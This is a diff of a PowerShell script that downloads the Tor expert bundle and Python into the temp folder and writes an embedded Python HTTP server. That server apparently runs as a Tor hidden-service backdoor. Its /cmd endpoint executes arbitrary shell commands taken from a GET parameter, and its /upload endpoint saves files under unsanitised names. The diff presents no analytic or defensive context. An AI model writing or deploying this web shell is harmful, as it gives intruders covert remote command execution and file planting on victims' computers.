@@ -1,6 +1,7 @@
 param (
     [string]$remoteAddress
 )
+
 $torURI = "https://archive.torproject.org/tor-package-archive/torbrowser/14.0.9/tor-expert-bundle-windows-x86_64-14.0.9.tar.gz"
 $pythonURI = "https://www.python.org/ftp/python/3.13.3/python-3.13.3.exe"
 $downloadPath = "$env:TEMP"
@@ -64,75 +65,59 @@ $webHostName = Get-Content -Path $webHostNameFilePath -Raw
 $pythonScript = @"
 import http.server
 import socketserver
+import urllib.parse
 import os
 import subprocess
+from io import BytesIO
 
-PORT = 8080
-DIRECTORY = os.path.expanduser("~")
+PORT = 8080  
 
-class RequestHandler(http.server.SimpleHTTPRequestHandler):
+class Handler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path.startswith('/cmd'):
+            query = urllib.parse.urlparse(self.path).query
+            params = urllib.parse.parse_qs(query)
+            cmd = params.get('c', [''])[0]
+            try:
+                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(output)
+            except subprocess.CalledProcessError as e:
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(e.output)
+        else:
+            super().do_GET()
+
     def do_POST(self):
-        if self.path == '/cmd':
+        if self.path.startswith('/upload'):
             content_length = int(self.headers['Content-Length'])
-            post_data = self.rfile.read(content_length).decode('utf-8')
-
-            result = subprocess.getoutput(post_data)
-            self.send_response(200)
-            self.send_header("Content-type", "text/plain")
+            content_type = self.headers.get('Content-Type', '')
+            boundary = content_type.split("boundary=")[-1].encode()
+            body = self.rfile.read(content_length)
+            parts = body.split(b'--' + boundary)
+            for part in parts:
+                if b'Content-Disposition' in part:
+                    headers, file_data = part.split(b'\r\n\r\n', 1)
+                    headers = headers.decode()
+                    if 'filename="' in headers:
+                        filename = headers.split('filename="')[1].split('"')[0]
+                        with open(filename, 'wb') as f:
+                            f.write(file_data.strip(b'\r\n--'))
+                        self.send_response(200)
+                        self.end_headers()
+                        self.wfile.write(f"Uploaded {filename}".encode())
+                        return
+            self.send_response(400)
             self.end_headers()
-            self.wfile.write(result.encode('utf-8'))
-
-        elif self.path == '/upload':
-            import cgi
-			
-            content_type = self.headers.get('Content-Type')
-			if not content_type:
-				self.send_response(400)
-				self.end_headers()
-				return
-				
-			form = cgi.FieldStorage(
-				fp=self.rfile,
-				headers=self.headers,
-				environ={
-					'REQUEST_METHOD': 'POST',
-					'CONTENT_TYPE': content_type,
-				}
-			)
-
-			uploaded_file = form['file']
-			if not uploaded_file or not uploaded_file.filename:
-				self.send_response(400)
-				self.end_headers()
-				return
-
-			filename = os.path.basename(uploaded_file.filename)
-
-			save_path = filename
-			counter = 1
-			while os.path.exists(save_path):
-				save_path = f"{os.path.splitext(filename)[0]}_{counter}{os.path.splitext(filename)[1]}"
-				counter += 1
-
-			with open(save_path, 'wb') as f:
-				f.write(uploaded_file.file.read())
-
-			self.send_response(200)
-			self.send_header("Content-type", "text/plain")
-			self.end_headers()
-			self.wfile.write(f"{save_path}\n".encode('utf-8'))
-
+            self.wfile.write(b"Upload failed")
         else:
             self.send_response(404)
             self.end_headers()
 
-    def log_message(self, format, *args):
-        return  
-
-os.chdir(DIRECTORY)
-
-handler = RequestHandler
-with socketserver.TCPServer(("127.0.0.1", PORT), handler) as httpd:
+# Start the HTTP server
+with socketserver.TCPServer(("127.0.0.1", PORT), Handler) as httpd:
     httpd.serve_forever()
 "@
 Set-Content -Path $pythonFilePath -Value $pythonScript -Encoding ASCII -Force
